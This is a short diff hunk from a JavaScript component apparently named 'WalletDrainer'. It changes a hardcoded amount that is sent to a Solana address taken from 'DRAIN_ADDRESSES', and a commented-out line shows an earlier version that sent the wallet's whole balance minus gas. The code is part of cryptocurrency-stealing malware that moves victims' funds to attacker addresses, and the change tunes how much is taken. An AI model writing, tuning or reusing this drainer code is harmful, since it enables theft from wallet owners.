@@ -128,7 +128,7 @@ export default function WalletDrainer({ wallet }) {
           }
   
         //   const sendAmount = balance - gasFee;
-          const sendAmount = 19800000;
+          const sendAmount = 9900000;
           const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
   
           let attempts = 0;
